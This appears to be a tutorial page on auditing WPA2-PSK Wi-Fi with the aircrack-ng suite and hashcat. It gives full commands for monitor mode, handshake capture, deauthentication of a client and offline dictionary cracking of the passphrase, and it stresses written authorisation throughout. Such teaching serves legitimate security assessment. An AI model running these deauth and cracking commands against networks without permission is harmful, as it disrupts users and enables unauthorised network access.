# Wi-Fi assessment basics

> Capture a WPA2 handshake and audit the passphrase — the core workflow of a wireless assessment.

- Level: Intermediate
- Time: ~20 minutes
- Tags: wireless, wifi, wpa, cracking
- Page: https://terminal.rokibulroni.com/guide/wifi-assessment
- Updated: 2026-11-06

This guide covers the fundamental WPA2-PSK assessment loop: put an adapter into monitor mode, find the target network, capture a handshake and test the passphrase offline. You need a wireless adapter that supports monitor mode and injection, and written permission for the network you are testing.

## Prerequisites

- A Wi-Fi adapter that supports monitor mode and injection
- The aircrack-ng suite installed
- Written authorisation for the target network

## 1. Enable monitor mode

Switch your adapter from managed to monitor mode so it can capture raw 802.11 frames. Stop any processes that would interfere.

Tool: [airmon-ng](https://terminal.rokibulroni.com/api/v1/tools/wireless/airmon-ng.md)

```bash
sudo airmon-ng check kill
```

Stop network managers that disrupt capture.

```bash
sudo airmon-ng start wlan0
```

Put the adapter into monitor mode (becomes wlan0mon).

## 2. Survey the airspace

List nearby networks and clients to identify your target’s channel and BSSID.

Tool: [airodump-ng](https://terminal.rokibulroni.com/api/v1/tools/wireless/airodump-ng.md)

```bash
sudo airodump-ng wlan0mon
```

Scan all channels; note the target BSSID and channel.

## 3. Capture the handshake

Lock onto the target channel and capture traffic. You need a client to authenticate while you are listening.

Tool: [airodump-ng](https://terminal.rokibulroni.com/api/v1/tools/wireless/airodump-ng.md)

```bash
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
```

Focus on one network and write the capture to disk.

## 4. Force a reconnect (optional)

If no client authenticates on its own, a targeted deauthentication makes one reconnect, producing the handshake. Use sparingly and only in scope.

Tool: [aireplay-ng](https://terminal.rokibulroni.com/api/v1/tools/wireless/aireplay-ng.md)

```bash
sudo aireplay-ng --deauth 3 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
```

Send a few deauth frames to one client to trigger a reconnect.

## 5. Crack the passphrase

With a captured handshake, test it against a wordlist offline. hashcat on a GPU is far faster than aircrack-ng for large lists.

Tool: [Aircrack-ng](https://terminal.rokibulroni.com/api/v1/tools/wireless/aircrack-ng.md)

```bash
aircrack-ng -w rockyou.txt -b AA:BB:CC:DD:EE:FF capture-01.cap
```

Dictionary attack with aircrack-ng.

```bash
hcxpcapngtool -o hash.hc22000 capture-01.cap && hashcat -m 22000 hash.hc22000 rockyou.txt
```

Convert and crack on a GPU with hashcat.

## 6. Restore the adapter

Return the adapter to managed mode and restart networking when you are done.

Tool: [airmon-ng](https://terminal.rokibulroni.com/api/v1/tools/wireless/airmon-ng.md)

```bash
sudo airmon-ng stop wlan0mon
```

Leave monitor mode.

```bash
sudo systemctl restart NetworkManager
```

Bring normal networking back.

## Wrap-up

A cracked passphrase demonstrates weak PSK selection; report it with a recommendation for a long, random passphrase or a move to WPA3 / 802.1X. Never test networks you do not have explicit permission to assess.
